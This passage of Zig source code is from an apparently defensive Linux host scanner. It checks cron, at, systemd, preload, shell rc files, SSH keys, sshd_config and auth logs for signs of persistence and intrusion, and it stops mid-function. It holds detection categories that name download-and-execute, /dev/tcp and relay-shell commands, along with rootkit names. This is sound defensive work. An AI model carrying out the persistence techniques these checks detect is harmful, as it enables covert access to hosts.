//! Persistence and access: scheduled jobs (cron, at), systemd units and timers, SSH keys and
//! sshd configuration, brute force in the auth log, preload hijacks, shell rc hooks that fetch
//! and run remote code, and exposed credentials. Commands are classified by tokens.commandRisk;
//! additions since the last baseline are reported as drift, and package-owned files are trusted
//! for drift (they change with upgrades).
const std = @import("std");
const scan = @import("../scan.zig");
const tokens = @import("../tokens.zig");
const procfs = @import("procfs.zig");
const finding = @import("../finding.zig");
const Host = @import("../host.zig").Host;

pub const checks = [_]scan.Check{
    .{ .id = "persistence.cron", .category = .persistence, .tier = .fast, .privilege = .partial, .os = .linux, .summary = "Cron jobs that download and execute, run from temp, or appeared since baseline", .run = checkCron },
    .{ .id = "persistence.at", .category = .persistence, .tier = .fast, .privilege = .root, .os = .linux, .summary = "Pending at jobs with risky commands or added since baseline", .run = checkAt },
    .{ .id = "persistence.systemd", .category = .persistence, .tier = .fast, .privilege = .none, .os = .linux, .summary = "systemd units and timers: risky Exec lines, unowned vendor units, new units", .run = checkSystemd },
    .{ .id = "persistence.systemd_hardening", .category = .hardening, .tier = .deep, .privilege = .none, .os = .linux, .summary = "Unowned root services without any sandboxing", .run = checkSystemdHardening },
    .{ .id = "persistence.preload", .category = .persistence, .tier = .fast, .privilege = .partial, .os = .linux, .summary = "/etc/ld.so.preload and LD_PRELOAD in process environments", .run = checkPreload },
    .{ .id = "persistence.shell_rc", .category = .persistence, .tier = .fast, .privilege = .partial, .os = .linux, .summary = "Shell profiles and rc files that fetch and run remote code", .run = checkShellRc },
    .{ .id = "access.ssh_keys", .category = .access, .tier = .fast, .privilege = .partial, .os = .linux, .summary = "authorized_keys: keys added since baseline, risky forced commands, loose permissions", .run = checkSshKeys },
    .{ .id = "access.sshd_config", .category = .access, .tier = .fast, .privilege = .partial, .os = .linux, .summary = "sshd_config: root login, password and empty-password authentication", .run = checkSshdConfig },
    .{ .id = "access.brute_force", .category = .access, .tier = .fast, .privilege = .partial, .os = .linux, .summary = "SSH brute force and successful logins after it, from the auth log", .run = checkBruteForce },
    .{ .id = "credential.exposure", .category = .credential, .tier = .fast, .privilege = .partial, .os = .linux, .summary = "Readable private keys, cloud credentials, shadow files and secrets in /etc/environment", .run = checkCredentials },
};

fn sha256Hex(s: *scan.Scan, bytes: []const u8) ![]const u8 {
    var d: [32]u8 = undefined;
    std.crypto.hash.sha2.Sha256.hash(bytes, &d, .{});
    return s.print("{x}", .{d[0..16]});
}

fn riskSeverity(r: tokens.CommandRisk) finding.Severity {
    return switch (r) {
        .download_exec, .decode_exec, .dev_tcp, .relay_shell => .critical,
        .temp_exec => .high,
    };
}

/// Files in a directory, sorted, as absolute paths in the scan arena.
fn listDir(s: *scan.Scan, dir_path: []const u8, denied: *usize) ![]const []const u8 {
    var out: std.ArrayList([]const u8) = .empty;
    var dir = (s.host.openDir(dir_path) catch {
        denied.* += 1;
        return out.items;
    }) orelse return out.items;
    defer dir.close(s.host.io);
    var it = dir.iterate();
    while (it.next(s.host.io) catch null) |entry| {
        if (entry.name.len == 0 or entry.name[0] == '.') continue;
        try out.append(s.arena(), try s.print("{s}/{s}", .{ std.mem.trimEnd(u8, dir_path, "/"), entry.name }));
        if (out.items.len > 10000) break;
    }
    std.mem.sort([]const u8, out.items, {}, struct {
        fn lt(_: void, a: []const u8, b: []const u8) bool {
            return std.mem.order(u8, a, b) == .lt;
        }
    }.lt);
    return out.items;
}

fn readText(s: *scan.Scan, path: []const u8, denied: *usize) ?[]const u8 {
    return s.host.readAlloc(s.arena(), path, 4 * 1024 * 1024) catch |e| {
        if (e == error.AccessDenied) denied.* += 1;
        return null;
    };
}

// Users -----------------------------------------------------------------------------------------

pub const User = struct { name: []const u8, uid: u32, home: []const u8, shell: []const u8 };

pub fn parsePasswd(gpa: std.mem.Allocator, text: []const u8, out: *std.ArrayList(User)) !void {
    var lines = std.mem.splitScalar(u8, text, '\n');
    while (lines.next()) |line| {
        if (line.len == 0 or line[0] == '#') continue;
        var f = std.mem.splitScalar(u8, line, ':');
        const name = f.next() orelse continue;
        _ = f.next() orelse continue;
        const uid = std.fmt.parseInt(u32, f.next() orelse continue, 10) catch continue;
        _ = f.next() orelse continue;
        _ = f.next() orelse continue;
        const home = f.next() orelse continue;
        const shell = f.next() orelse "";
        if (home.len < 2 or home[0] != '/' or std.mem.eql(u8, home, "/nonexistent")) continue;
        try out.append(gpa, .{ .name = name, .uid = uid, .home = home, .shell = shell });
        if (out.items.len >= 10000) return;
    }
}

/// Users with a home directory that exists, root first; duplicate homes are kept once.
fn users(s: *scan.Scan) ![]const User {
    var list: std.ArrayList(User) = .empty;
    const text = s.host.readAlloc(s.arena(), "/etc/passwd", 16 * 1024 * 1024) catch return list.items;
    var all: std.ArrayList(User) = .empty;
    try parsePasswd(s.arena(), text, &all);
    var homes: std.StringHashMapUnmanaged(void) = .empty;
    defer homes.deinit(s.gpa);
    for (all.items) |u| {
        if ((try homes.getOrPut(s.gpa, u.home)).found_existing) continue;
        const st = s.host.stat(u.home, true) catch continue;
        if (st.kind() != .directory) continue;
        try list.append(s.arena(), u);
    }
    return list.items;
}

// Cron and at -----------------------------------------------------------------------------------

/// The command of a crontab line, or null for comments, blank lines and variable assignments.
/// `system` crontabs (/etc/crontab, /etc/cron.d) carry a user field.
pub fn cronCommand(line_raw: []const u8, system: bool) ?[]const u8 {
    const line = std.mem.trim(u8, line_raw, " \t\r");
    if (line.len == 0 or line[0] == '#') return null;
    var rest = line;
    var fields: usize = 0;
    const time_fields: usize = if (line[0] == '@') 1 else 5;
    const skip = time_fields + @as(usize, if (system) 1 else 0);
    // A variable assignment has '=' before any whitespace.
    const eq = std.mem.indexOfScalar(u8, line, '=');
    const ws = std.mem.indexOfAny(u8, line, " \t");
    if (eq != null and (ws == null or eq.? < ws.?)) return null;
    while (fields < skip) : (fields += 1) {
        rest = std.mem.trimStart(u8, rest, " \t");
        const end = std.mem.indexOfAny(u8, rest, " \t") orelse return null;
        rest = rest[end..];
    }
    const cmd = std.mem.trim(u8, rest, " \t");
    return if (cmd.len == 0) null else cmd;
}

fn scanJobFile(s: *scan.Scan, path: []const u8, text: []const u8, mode: enum { system_crontab, user_crontab, script }, kind: []const u8) !void {
    const owned = s.owned(path);
    var lines = std.mem.splitScalar(u8, text, '\n');
    var line_no: usize = 0;
    while (lines.next()) |line| {
        line_no += 1;
        const cmd = switch (mode) {
            .system_crontab => cronCommand(line, true),
            .user_crontab => cronCommand(line, false),
            .script => blk: {
                const t = std.mem.trim(u8, line, " \t\r");
                break :blk if (t.len == 0 or t[0] == '#') null else t;
            },
        } orelse continue;
        if (tokens.commandRisk(cmd)) |risk| {
            try s.add(.{
                .severity = riskSeverity(risk),
                .category = .persistence,
                .title = "Scheduled job runs a risky command",
                .description = try s.print("{s} line {d} {s}: {s}", .{ path, line_no, risk.describe(), cmd }),
                .remediation = try s.print("Remove the entry from {s} unless you put it there, then find how it was added (other persistence, compromised accounts).", .{path}),
                .subject = path,
                .details = try s.details(&.{ .{ .key = "line", .value = try s.print("{d}", .{line_no}) }, .{ .key = "command", .value = try s.dupe(cmd) }, .{ .key = "risk", .value = @tagName(risk) } }),
            });
        }
        if (mode == .script or owned) continue;
        const known = s.baseline.hasSubject(kind, path) or s.baseline.tracks(kind);
        if (try s.drift(kind, path, try sha256Hex(s, cmd)) and known) {
            try s.add(.{
                .severity = .medium,
                .category = .persistence,
                .title = "New scheduled job since the baseline",
                .description = try s.print("{s} has a job that was not there at the last accepted scan: {s}", .{ path, cmd }),
                .remediation = "Confirm who added it; accept it with zav host --update-baseline if it is legitimate.",
                .subject = path,
                .details = try s.details(&.{.{ .key = "command", .value = try s.dupe(cmd) }}),
            });
        }
    }
}

fn checkCron(s: *scan.Scan) !void {
    var denied: usize = 0;
    if (readText(s, "/etc/crontab", &denied)) |t| try scanJobFile(s, "/etc/crontab", t, .system_crontab, "cron.entry");
    if (readText(s, "/etc/anacrontab", &denied)) |t| try scanJobFile(s, "/etc/anacrontab", t, .script, "cron.entry");
    for (try listDir(s, "/etc/cron.d", &denied)) |p| if (readText(s, p, &denied)) |t| try scanJobFile(s, p, t, .system_crontab, "cron.entry");
    for ([_][]const u8{ "/var/spool/cron/crontabs", "/var/spool/cron" }) |d| {
        for (try listDir(s, d, &denied)) |p| {
            const st = s.host.stat(p, false) catch continue;
            if (st.kind() != .file) continue;
            if (readText(s, p, &denied)) |t| try scanJobFile(s, p, t, .user_crontab, "cron.entry");
        }
    }
    for ([_][]const u8{ "/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly" }) |d| {
        for (try listDir(s, d, &denied)) |p| {
            if (readText(s, p, &denied)) |t| try scanJobFile(s, p, t, .script, "cron.script");
            if (!s.owned(p)) {
                const known = s.baseline.tracks("cron.script");
                if (try s.drift("cron.script", p, "present") and known) try s.add(.{
                    .severity = .medium,
                    .category = .persistence,
                    .title = "New periodic cron script since the baseline",
                    .description = try s.print("{s} is not owned by any package and was not there at the last accepted scan.", .{p}),
                    .remediation = "Review the script; remove it unless you installed it.",
                    .subject = p,
                });
            }
        }
    }
    if (denied > 0) try s.reduced("{d} cron files or directories were unreadable without root", .{denied});
}

fn checkAt(s: *scan.Scan) !void {
    var denied: usize = 0;
    for ([_][]const u8{ "/var/spool/cron/atjobs", "/var/spool/at" }) |d| {
        for (try listDir(s, d, &denied)) |p| {
            const st = s.host.stat(p, false) catch continue;
            if (st.kind() != .file) continue;
            const t = readText(s, p, &denied) orelse continue;
            try scanJobFile(s, p, t, .script, "at.job");
            const known = s.baseline.tracks("at.job");
            if (try s.drift("at.job", p, try sha256Hex(s, t)) and known) try s.add(.{
                .severity = .medium,
                .category = .persistence,
                .title = "New at job since the baseline",
                .description = try s.print("{s} is a pending at job that was not there at the last accepted scan.", .{p}),
                .remediation = "Inspect it with at -c <job> and remove it with atrm if it is not yours.",
                .subject = p,
            });
        }
    }
    if (denied > 0) try s.reduced("{d} at spool entries were unreadable", .{denied});
}

// systemd ---------------------------------------------------------------------------------------

pub const Unit = struct {
    exec: [16][]const u8 = undefined,
    exec_count: usize = 0,
    user: []const u8 = "",
    sandboxed: bool = false,
};

/// The Exec* commands, User= and whether any sandboxing directive is set.
pub fn parseUnit(text: []const u8) Unit {
    var u: Unit = .{};
    var lines = std.mem.splitScalar(u8, text, '\n');
    const sandbox = [_][]const u8{ "NoNewPrivileges", "ProtectSystem", "ProtectHome", "PrivateTmp", "DynamicUser", "CapabilityBoundingSet", "SystemCallFilter", "RestrictNamespaces", "ProtectKernelModules" };
    while (lines.next()) |raw| {
        const line = std.mem.trim(u8, raw, " \t\r");
        const eq = std.mem.indexOfScalar(u8, line, '=') orelse continue;
        const key = std.mem.trim(u8, line[0..eq], " \t");
        var value = std.mem.trim(u8, line[eq + 1 ..], " \t");
        if (std.mem.startsWith(u8, key, "Exec")) {
            // Strip the special prefixes: -, @, +, !, !!, :
            while (value.len > 0 and std.mem.indexOfScalar(u8, "-@+!:", value[0]) != null) value = value[1..];
            if (value.len > 0 and u.exec_count < u.exec.len) {
                u.exec[u.exec_count] = value;
                u.exec_count += 1;
            }
        } else if (std.mem.eql(u8, key, "User")) {
            u.user = value;
        } else for (sandbox) |sb| if (std.mem.eql(u8, key, sb)) {
            u.sandboxed = true;
        };
    }
    return u;
}

const vendor_unit_dirs = [_][]const u8{ "/usr/lib/systemd/system", "/lib/systemd/system", "/usr/lib/systemd/user" };
const admin_unit_dirs = [_][]const u8{ "/etc/systemd/system", "/run/systemd/system", "/etc/systemd/user" };

fn isUnitFile(path: []const u8) bool {
    return std.mem.endsWith(u8, path, ".service") or std.mem.endsWith(u8, path, ".timer") or std.mem.endsWith(u8, path, ".socket") or std.mem.endsWith(u8, path, ".path");
}

fn unitFiles(s: *scan.Scan, dir: []const u8, denied: *usize, out: *std.ArrayList([]const u8)) !void {
    for (try listDir(s, dir, denied)) |p| {
        const st = s.host.stat(p, false) catch continue;
        if (st.kind() == .directory and std.mem.endsWith(u8, p, ".d")) continue;
        if (st.kind() != .file or !isUnitFile(p)) continue;
        try out.append(s.arena(), p);
    }
}

fn checkSystemd(s: *scan.Scan) !void {
    var denied: usize = 0;
    var files: std.ArrayList([]const u8) = .empty;
    for (vendor_unit_dirs ++ admin_unit_dirs) |d| try unitFiles(s, d, &denied, &files);
    for (try users(s)) |u| {
        const d = try s.print("{s}/.config/systemd/user", .{u.home});
        try unitFiles(s, d, &denied, &files);
    }
    const have_pkgdb = s.packages() != null or s.options.ownership != null;
    for (files.items) |path| {
        const text = readText(s, path, &denied) orelse continue;
        const unit = parseUnit(text);
        const owned = s.owned(path);
        for (unit.exec[0..unit.exec_count]) |cmd| {
            const program = std.mem.sliceTo(cmd, ' ');
            const risk = tokens.commandRisk(cmd) orelse if (@import("process.zig").exeRisk(program) != null) tokens.CommandRisk.temp_exec else null;
            if (risk) |r| try s.add(.{
                .severity = riskSeverity(r),
                .category = .persistence,
                .title = "systemd unit runs a risky command",
                .description = try s.print("{s} {s}: {s}", .{ path, r.describe(), cmd }),
                .remediation = try s.print("Stop and disable the unit (systemctl disable --now {s}), remove the file, and investigate how it was installed.", .{tokens.basename(path)}),
                .subject = path,
                .details = try s.details(&.{ .{ .key = "exec", .value = try s.dupe(cmd) }, .{ .key = "risk", .value = @tagName(r) } }),
            });
        }
        if (owned) continue;
        var vendor = false;
        for (vendor_unit_dirs) |d| if (std.mem.startsWith(u8, path, d)) {
            vendor = true;
        };
        if (vendor and have_pkgdb) {
            try s.add(.{
                .severity = .medium,
                .category = .persistence,
                .title = "Unit in a vendor directory that no package owns",
                .description = try s.print("{s} sits in a directory reserved for packaged units but belongs to no package. Administrators put units in /etc/systemd/system; malware hides among vendor units.", .{path}),
                .remediation = "Find out what installed it; move legitimate units to /etc/systemd/system and remove anything unknown.",
                .subject = path,
                .details = try s.details(&.{.{ .key = "exec", .value = if (unit.exec_count > 0) try s.dupe(unit.exec[0]) else "" }}),
            });
            continue;
        }
        const known = s.baseline.tracks("systemd.unit");
        if (try s.drift("systemd.unit", path, try sha256Hex(s, text)) and known) try s.add(.{
            .severity = .medium,
            .category = .persistence,
            .title = "systemd unit added or changed since the baseline",
            .description = try s.print("{s} is new or different since the last accepted scan{s}{s}.", .{ path, if (unit.exec_count > 0) "; it runs " else "", if (unit.exec_count > 0) unit.exec[0] else "" }),
            .remediation = "Review the unit; accept it with zav host --update-baseline if you made the change.",
            .subject = path,
        });
    }
    if (denied > 0) try s.reduced("{d} unit files or directories were unreadable", .{denied});
}

fn checkSystemdHardening(s: *scan.Scan) !void {
    var denied: usize = 0;
    var files: std.ArrayList([]const u8) = .empty;
    for (admin_unit_dirs ++ vendor_unit_dirs) |d| try unitFiles(s, d, &denied, &files);
    for (files.items) |path| {
        if (!std.mem.endsWith(u8, path, ".service") or s.owned(path)) continue;
        const text = readText(s, path, &denied) orelse continue;
        const unit = parseUnit(text);
        if (unit.exec_count == 0 or unit.sandboxed) continue;
        if (unit.user.len > 0 and !std.mem.eql(u8, unit.user, "root") and !std.mem.eql(u8, unit.user, "0")) continue;
        try s.add(.{
            .severity = .low,
            .category = .hardening,
            .title = "Root service without sandboxing",
            .description = try s.print("{s} runs {s} as root with no sandboxing directive (NoNewPrivileges, ProtectSystem, PrivateTmp, ...). A compromise of the service is a compromise of the host.", .{ path, unit.exec[0] }),
            .remediation = "Add User=, NoNewPrivileges=yes, ProtectSystem=strict and PrivateTmp=yes where the service allows; systemd-analyze security <unit> lists more.",
            .subject = path,
        });
    }
}

// Preload ---------------------------------------------------------------------------------------

fn checkPreload(s: *scan.Scan) !void {
    var denied: usize = 0;
    if (readText(s, "/etc/ld.so.preload", &denied)) |text| {
        var words = std.mem.tokenizeAny(u8, text, " \t\r\n:");
        while (words.next()) |lib| {
            if (lib[0] == '#') continue;
            const owned = s.owned(lib);
            const temp = tokens.isTempPath(lib) or @import("process.zig").exeRisk(lib) != null;
            try s.add(.{
                .severity = if (temp or !owned) .critical else .medium,
                .category = .persistence,
                .title = "Library preloaded into every process via /etc/ld.so.preload",
                .description = try s.print("/etc/ld.so.preload loads {s} into every dynamically linked program{s}. Userland rootkits (Azazel, Jynx, libprocesshider) use this to hide files and processes.", .{ lib, if (owned) "" else "; no package owns it" }),
                .remediation = "Remove the entry from /etc/ld.so.preload (statically linked busybox works if tools misbehave), then analyse the library.",
                .subject = try s.dupe(lib),
                .details = try s.details(&.{.{ .key = "owned_by", .value = s.owner(lib) orelse "" }}),
            });
        }
    }
    var path_buf: [64]u8 = undefined;
    var unreadable: usize = 0;
    for (try s.processes()) |p| {
        if (p.isKernelThread()) continue;
        const env_path = std.fmt.bufPrint(&path_buf, "/proc/{d}/environ", .{p.pid}) catch continue;
        const env = s.host.readAlloc(s.gpa, env_path, 1024 * 1024) catch |e| {
            if (e == error.AccessDenied) unreadable += 1;
            continue;
        };
        defer s.gpa.free(env);
        const value = procfs.environGet(env, "LD_PRELOAD") orelse continue;
        var libs = std.mem.tokenizeAny(u8, value, " :");
        while (libs.next()) |lib| {
            if (s.owned(lib)) continue;
            const temp = tokens.isTempPath(lib);
            try s.add(.{
                .severity = if (temp) .critical else .high,
                .category = .persistence,
                .title = "Process runs with an unowned LD_PRELOAD library",
                .description = try s.print("Process {d} ({s}) has LD_PRELOAD={s}, a library no package owns, injected into it at start.", .{ p.pid, p.comm, lib }),
                .remediation = try s.print("Identify who set LD_PRELOAD for process {d} (its parent, unit or profile) and analyse the library.", .{p.pid}),
                .subject = try s.dupe(lib),
                .pid = p.pid,
            });
        }
    }
    if (unreadable > 0) try s.reduced("environments of {d} processes were unreadable without root", .{unreadable});
}

// Shell rc --------------------------------------------------------------------------------------

const system_rc = [_][]const u8{ "/etc/profile", "/etc/bash.bashrc", "/etc/bashrc", "/etc/zsh/zshrc", "/etc/zsh/zprofile", "/etc/zshrc", "/etc/zprofile", "/etc/environment" };
const user_rc = [_][]const u8{ ".bashrc", ".bash_profile", ".bash_login", ".bash_logout", ".profile", ".zshrc", ".zprofile", ".zshenv", ".zlogin" };

fn scanRc(s: *scan.Scan, path: []const u8, denied: *usize) !void {
    const text = readText(s, path, denied) orelse return;
    var lines = std.mem.splitScalar(u8, text, '\n');
    var n: usize = 0;
    while (lines.next()) |raw| {
        n += 1;
        const line = std.mem.trim(u8, raw, " \t\r");
        if (line.len == 0 or line[0] == '#') continue;
        const risk = tokens.commandRisk(line) orelse continue;
        try s.add(.{
            .severity = if (risk == .temp_exec) .medium else .high,
            .category = .persistence,
            .title = "Shell startup file runs a risky command",
            .description = try s.print("{s} line {d} {s} every time a shell starts: {s}", .{ path, n, risk.describe(), line }),
            .remediation = try s.print("Remove the line from {s} and check who modified the file.", .{path}),
            .subject = path,
            .details = try s.details(&.{ .{ .key = "line", .value = try s.print("{d}", .{n}) }, .{ .key = "risk", .value = @tagName(risk) } }),
        });
    }
}

fn checkShellRc(s: *scan.Scan) !void {
    var denied: usize = 0;
    for (system_rc) |p| try scanRc(s, p, &denied);
    for (try listDir(s, "/etc/profile.d", &denied)) |p| try scanRc(s, p, &denied);
    for (try users(s)) |u| for (user_rc) |name| {
        try scanRc(s, try s.print("{s}/{s}", .{ u.home, name }), &denied);
    };
    if (denied > 0) try s.reduced("{d} shell startup files were unreadable without root", .{denied});
}

// SSH -------------------------------------------------------------------------------------------

pub const AuthorizedKey = struct {
    options: []const u8,
    key_type: []const u8,
    blob_b64: []const u8,
    comment: []const u8,
};

fn isKeyType(t: []const u8) bool {
    return std.mem.startsWith(u8, t, "ssh-") or std.mem.startsWith(u8, t, "ecdsa-sha2-") or std.mem.startsWith(u8, t, "sk-");
}

/// One authorized_keys line: `[options] type base64 [comment]`. Options may contain quoted
/// spaces (command="...").
pub fn parseAuthorizedKey(line_raw: []const u8) ?AuthorizedKey {
    const line = std.mem.trim(u8, line_raw, " \t\r");
    if (line.len == 0 or line[0] == '#') return null;
    var options: []const u8 = "";
    var rest = line;
    if (!isKeyType(std.mem.sliceTo(line, ' '))) {
        // Options run to the first space outside quotes.
        var i: usize = 0;
        var quoted = false;
        while (i < line.len) : (i += 1) {
            if (line[i] == '\\' and i + 1 < line.len) {
                i += 1;
                continue;
            }
            if (line[i] == '"') quoted = !quoted;
            if (!quoted and (line[i] == ' ' or line[i] == '\t')) break;
        }
        options = line[0..i];
        rest = std.mem.trimStart(u8, line[i..], " \t");
    }
    var f = std.mem.tokenizeAny(u8, rest, " \t");
    const key_type = f.next() orelse return null;
    if (!isKeyType(key_type)) return null;
    const blob = f.next() orelse return null;
    return .{ .options = options, .key_type = key_type, .blob_b64 = blob, .comment = std.mem.trim(u8, f.rest(), " \t") };
}

/// OpenSSH's SHA256 fingerprint: unpadded base64 of SHA-256 over the decoded key blob.
pub fn fingerprint(blob_b64: []const u8, out: *[64]u8) ?[]const u8 {
    var raw: [8192]u8 = undefined;
    const n = std.base64.standard.Decoder.calcSizeForSlice(blob_b64) catch return null;
    if (n > raw.len) return null;
    std.base64.standard.Decoder.decode(raw[0..n], blob_b64) catch return null;
    var d: [32]u8 = undefined;
    std.crypto.hash.sha2.Sha256.hash(raw[0..n], &d, .{});
    @memcpy(out[0..7], "SHA256:");
    const enc = std.base64.standard_no_pad.Encoder.encode(out[7..], &d);
    return out[0 .. 7 + enc.len];
}

/// The `command="..."` forced command of an options string.
pub fn forcedCommand(options: []const u8) ?[]const u8 {
    const start = std.mem.indexOf(u8, options, "command=\"") orelse return null;
    const body = options[start + 9 ..];
    var i: usize = 0;
    while (i < body.len) : (i += 1) {
        if (body[i] == '\\') {
            i += 1;
            continue;
        }
        if (body[i] == '"') return body[0..i];
    }
    return null;
}

fn checkSshKeys(s: *scan.Scan) !void {
    var denied: usize = 0;
    for (try users(s)) |u| for ([_][]const u8{ ".ssh/authorized_keys", ".ssh/authorized_keys2" }) |name| {
        const path = try s.print("{s}/{s}", .{ u.home, name });
        const text = readText(s, path, &denied) orelse continue;
        if (s.host.stat(path, true)) |st| {
            if (st.mode & 0o022 != 0) try s.add(.{
                .check = "access.ssh_keys",
                .severity = .high,
                .category = .access,
                .title = "authorized_keys is writable by other users",
                .description = try s.print("{s} has mode {o}: other users can add keys and log in as {s}.", .{ path, st.mode & 0o777, u.name }),
                .remediation = try s.print("chmod 600 {s} and chmod go-w on the .ssh directory and home directory.", .{path}),
                .subject = path,
            });
        } else |_| {}
        const tracked = s.baseline.tracks("ssh.authorized_key");
        var lines = std.mem.splitScalar(u8, text, '\n');
        while (lines.next()) |line| {
            const key = parseAuthorizedKey(line) orelse continue;
            var fp_buf: [64]u8 = undefined;
            const fp = fingerprint(key.blob_b64, &fp_buf) orelse continue;
            const fp_copy = try s.dupe(fp);
            if (forcedCommand(key.options)) |cmd| if (tokens.commandRisk(cmd)) |risk| try s.add(.{
                .severity = riskSeverity(risk),
                .category = .access,
                .title = "SSH key with a risky forced command",
                .description = try s.print("A key in {s} ({s} {s}) forces the command '{s}', which {s}.", .{ path, key.key_type, fp_copy, cmd, risk.describe() }),
                .remediation = "Remove the key line unless the forced command is intended.",
                .subject = path,
                .details = try s.details(&.{.{ .key = "fingerprint", .value = fp_copy }}),
            });
            if (try s.drift("ssh.authorized_key", path, fp_copy) and tracked) try s.add(.{
                .severity = .high,
                .category = .access,
                .title = "SSH key added since the baseline",
                .description = try s.print("{s} gained a key that was not there at the last accepted scan: {s} {s} {s}. Attackers add their own key to keep access.", .{ path, key.key_type, fp_copy, key.comment }),
                .remediation = try s.print("If you did not add it, remove the line from {s}, rotate credentials for {s} and review recent logins (last, auth log). Accept intended keys with zav host --update-baseline.", .{ path, u.name }),
                .subject = path,
                .details = try s.details(&.{
                    .{ .key = "user", .value = u.name },
                    .{ .key = "fingerprint", .value = fp_copy },
                    .{ .key = "type", .value = try s.dupe(key.key_type) },
                    .{ .key = "comment", .value = try s.dupe(key.comment) },
                }),
            });
        }
    };
    if (denied > 0) try s.reduced("{d} authorized_keys files were unreadable without root", .{denied});
}

pub const SshdConfig = struct {
    permit_root_login: ?[]const u8 = null,
    password_authentication: ?[]const u8 = null,
    permit_empty_passwords: ?[]const u8 = null,
};

/// sshd_config semantics: the first value for a keyword wins, and parsing of global settings
/// stops at the first Match block. Include directives are followed (globs in the last path
/// component, files in lexical order) up to a depth limit.
pub fn parseSshdConfig(s: *scan.Scan, path: []const u8, cfg: *SshdConfig, depth: u8, denied: *usize) !bool {
    if (depth > 8) return true;
    const text = readText(s, path, denied) orelse return true;
    var lines = std.mem.splitScalar(u8, text, '\n');
    while (lines.next()) |raw| {
        const line = std.mem.trim(u8, raw, " \t\r");
        if (line.len == 0 or line[0] == '#') continue;
        const sep = std.mem.indexOfAny(u8, line, " \t=") orelse continue;
        const key = line[0..sep];
        const value = std.mem.trim(u8, line[sep..], " \t=\"");
        if (std.ascii.eqlIgnoreCase(key, "Match")) return false;
        if (std.ascii.eqlIgnoreCase(key, "Include")) {
            var pats = std.mem.tokenizeAny(u8, value, " \t");
            while (pats.next()) |pat| {
                const full = if (pat[0] == '/') pat else try s.print("/etc/ssh/{s}", .{pat});
                const dir = std.fs.path.dirname(full) orelse continue;
                const base = tokens.basename(full);
                if (std.mem.indexOfAny(u8, base, "*?") == null) {
                    if (!try parseSshdConfig(s, full, cfg, depth + 1, denied)) return false;
                    continue;
                }
                for (try listDir(s, dir, denied)) |p| {
                    if (!@import("../suppress.zig").glob(base, tokens.basename(p))) continue;
                    if (!try parseSshdConfig(s, p, cfg, depth + 1, denied)) return false;
                }
            }
            continue;
        }
        const v = try s.dupe(value);
        if (std.ascii.eqlIgnoreCase(key, "PermitRootLogin")) {
            if (cfg.permit_root_login == null) cfg.permit_root_login = v;
        } else if (std.ascii.eqlIgnoreCase(key, "PasswordAuthentication")) {
            if (cfg.password_authentication == null) cfg.password_authentication = v;
        } else if (std.ascii.eqlIgnoreCase(key, "PermitEmptyPasswords")) {
            if (cfg.permit_empty_passwords == null) cfg.permit_empty_passwords = v;
        }
    }
    return true;
}

fn checkSshdConfig(s: *scan.Scan) !void {
    if (!s.host.exists("/etc/ssh/sshd_config")) return;
    var denied: usize = 0;
    var cfg: SshdConfig = .{};
    _ = try parseSshdConfig(s, "/etc/ssh/sshd_config", &cfg, 0, &denied);
    if (denied > 0) {
        try s.reduced("sshd_config (or an included file) was unreadable without root", .{});
        return;
    }
    const running = s.context.has(.sshd);
    const note = if (running) "sshd is running" else "sshd is not running now, but the configuration applies when it starts";
    if (cfg.permit_empty_passwords) |v| if (std.ascii.eqlIgnoreCase(v, "yes")) try s.add(.{
        .check = "access.sshd_empty_passwords",
        .severity = .critical,
        .category = .access,
        .title = "sshd allows empty passwords",
        .description = try s.print("PermitEmptyPasswords yes lets accounts without a password log in over SSH ({s}).", .{note}),
        .remediation = "Set PermitEmptyPasswords no in /etc/ssh/sshd_config and reload sshd.",
        .subject = "/etc/ssh/sshd_config",
    });
    if (cfg.permit_root_login) |v| if (std.ascii.eqlIgnoreCase(v, "yes")) try s.add(.{
        .check = "access.sshd_root_login",
        .severity = .high,
        .category = .access,
        .title = "sshd allows root login with a password",
        .description = try s.print("PermitRootLogin yes allows password logins as root, the first account every brute-force bot tries ({s}).", .{note}),
        .remediation = "Set PermitRootLogin prohibit-password (or no) and use a personal account with sudo.",
        .subject = "/etc/ssh/sshd_config",
    });
    const pw = cfg.password_authentication orelse "yes (default)";
    if (std.ascii.startsWithIgnoreCase(pw, "yes")) try s.add(.{
        .check = "access.sshd_password",
        .severity = if (running) .medium else .low,
        .category = .access,
        .title = "sshd accepts password authentication",
        .description = try s.print("PasswordAuthentication is {s}, so SSH accepts passwords and is exposed to brute force ({s}).", .{ pw, note }),
        .remediation = "Use keys and set PasswordAuthentication no (check /etc/ssh/sshd_config.d/ drop-ins, which take precedence).",
        .subject = "/etc/ssh/sshd_config",
        .details = try s.details(&.{.{ .key = "value", .value = pw }}),
    });
}

pub const AuthEvent = union(enum) { failure: []const u8, success: []const u8 };

/// Classify one auth log line, returning the source address.
pub fn parseAuthLine(line: []const u8) ?AuthEvent {
    if (std.mem.indexOf(u8, line, "sshd") == null) return null;
    const failures = [_][]const u8{ "Failed password for ", "Invalid user ", "Failed publickey for ", "authentication failure;" };
    for (failures) |f| if (std.mem.indexOf(u8, line, f) != null) {
        const addr = addressAfter(line, " from ") orelse addressAfter(line, "rhost=") orelse return null;
        return .{ .failure = addr };
    };
    if (std.mem.indexOf(u8, line, "Accepted password for ") != null or std.mem.indexOf(u8, line, "Accepted keyboard-interactive") != null or std.mem.indexOf(u8, line, "Accepted publickey for ") != null) {
        return .{ .success = addressAfter(line, " from ") orelse return null };
    }
    return null;
}

fn addressAfter(line: []const u8, marker: []const u8) ?[]const u8 {
    const i = std.mem.lastIndexOf(u8, line, marker) orelse return null;
    const rest = line[i + marker.len ..];
    const end = std.mem.indexOfAny(u8, rest, " \t") orelse rest.len;
    const addr = rest[0..end];
    if (addr.len == 0 or addr.len > 45) return null;
    for (addr) |c| if (!(std.ascii.isHex(c) or c == '.' or c == ':')) return null;
    return addr;
}

fn checkBruteForce(s: *scan.Scan) !void {
    var counts: std.StringHashMapUnmanaged(u32) = .empty;
    defer counts.deinit(s.gpa);
    var successes: std.ArrayList([]const u8) = .empty;
    defer successes.deinit(s.gpa);
    var read_any = false;
    var denied: usize = 0;
    for ([_][]const u8{ "/var/log/auth.log.1", "/var/log/auth.log", "/var/log/secure.1", "/var/log/secure" }) |path| {
        const st = s.host.stat(path, true) catch continue;
        var file = s.host.root.openFile(s.host.io, Host.rel(path), .{}) catch {
            denied += 1;
            continue;
        };
        defer file.close(s.host.io);
        // The last 8 MiB is enough to see an ongoing attack.
        const tail: u64 = @min(st.size, 8 * 1024 * 1024);
        const text = try s.gpa.alloc(u8, @intCast(tail));
